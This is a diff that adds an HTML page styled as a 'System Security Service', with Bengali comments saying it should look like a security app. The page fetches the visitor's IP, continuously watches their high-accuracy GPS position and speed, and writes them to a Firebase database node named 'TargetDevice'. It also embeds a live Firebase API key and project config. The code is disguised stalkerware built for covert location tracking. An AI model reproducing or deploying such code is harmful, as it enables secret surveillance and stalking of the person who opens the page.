@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Service</title>
+    <style>
+        /* দেখতে যেন সিকিউরিটি অ্যাপ মনে হয় */
+        body {
+            background-color: #1a1a1d;
+            color: #c5c6c7;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #66fcf1;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { color: #66fcf1; font-weight: bold; }
+        .hidden-mode { font-size: 10px; opacity: 0.5; margin-top: 50px;}
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h3>Security Protocol: <span class="status" id="status-text">Initializing...</span></h3>
+    <p>Device IP: <span id="ip-display">Checking...</span></p>
+    
+    <div class="hidden-mode">System is running in background...</div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        // তোর দেওয়া কনফিগারেশন
+        const firebaseConfig = {
+            apiKey: "AIzaSyDtoUCpjez11qn_zimaVyz7oJ6vSE7yKAM",
+            authDomain: "my-location-b3639.firebaseapp.com",
+            databaseURL: "https://my-location-b3639-default-rtdb.firebaseio.com",
+            projectId: "my-location-b3639",
+            storageBucket: "my-location-b3639.firebasestorage.app",
+            messagingSenderId: "242530750540",
+            appId: "1:242530750540:web:209710b20d34404e7b24e9",
+            measurementId: "G-0D0PX9S4FQ"
+        };
+
+        // Firebase শুরু করা
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.database();
+
+        // ১. আইপি বের করা
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('ip-display').innerText = data.ip;
+                startTracking(data.ip);
+            })
+            .catch(() => {
+                document.getElementById('ip-display').innerText = "Hidden";
+                startTracking("Unknown");
+            });
+
+        // ২. ট্র্যাকিং লজিক
+        function startTracking(ip) {
+            if (navigator.geolocation) {
+                document.getElementById('status-text').innerText = "ACTIVE";
+                
+                // লোকেশন ওয়াচ করা (লাইভ আপডেট)
+                navigator.geolocation.watchPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const speed = position.coords.speed || 0; // গতিবেগ
+                    const time = new Date().toLocaleString();
+
+                    // ডাটাবেসে পাঠানো
+                    db.ref('TargetDevice').set({
+                        latitude: lat,
+                        longitude: lng,
+                        ip: ip,
+                        speed: speed,
+                        lastSeen: time,
+                        battery: "Unknown" // ভবিষ্যতে ব্যাটারি লেভেল অ্যাড করা যাবে
+                    });
+
+                }, (error) => {
+                    document.getElementById('status-text').innerText = "GPS PERMISSION DENIED";
+                    console.error(error);
+                }, {
+                    enableHighAccuracy: true,
+                    maximumAge: 0
+                });
+            } else {
+                alert("GPS not supported in this browser.");
+            }
+        }
+    </script>
+</body>
+</html>
